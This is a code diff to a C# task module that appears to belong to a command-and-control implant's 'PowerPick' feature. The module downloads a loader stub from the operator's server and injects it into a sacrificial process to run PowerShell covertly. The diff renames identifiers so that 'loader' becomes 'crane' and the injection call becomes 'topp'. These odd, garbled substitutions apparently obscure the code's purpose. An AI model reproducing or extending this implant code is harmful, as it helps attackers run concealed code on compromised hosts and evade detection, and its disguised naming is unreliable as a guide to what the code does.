@@ -33,8 +33,8 @@ namespace Tasks
             public string PipeName;
             [DataMember(Name = "powershell_params")]
             public string PowerShellParams;
-            [DataMember(Name = "loader_stub_id")]
-            public string LoaderStubId;
+            [DataMember(Name = "crane_stub_id")]
+            public string craneStubId;
         }
 
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
@@ -141,15 +141,15 @@ namespace Tasks
             try
             {
                 PowerPickParameters parameters = _jsonSerializer.Deserialize<PowerPickParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
+                if (string.IsNullOrEmpty(parameters.craneStubId) ||
                     string.IsNullOrEmpty(parameters.PowerShellParams) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
                     throw new ArgumentNullException($"One or more required arguments was not provided.");
                 }
-                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] psPic))
+                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.craneStubId, out byte[] psPic))
                 {
-                    throw new ExecuteAssemblyException($"Failed to download powerpick loader stub (with id: {parameters.LoaderStubId})");
+                    throw new ExecuteAssemblyException($"Failed to download powerpick crane stub (with id: {parameters.craneStubId})");
                 }
 
                 ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
@@ -175,7 +175,7 @@ namespace Tasks
                 );
                 if (!proc.topp(psPic))
                 {
-                    throw new ExecuteAssemblyException($"Failed to topp powerpick loader into sacrificial process {info.Application}.");
+                    throw new ExecuteAssemblyException($"Failed to topp powerpick crane into sacrificial process {info.Application}.");
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(
                     CreateTaskResponse("", false, messages:
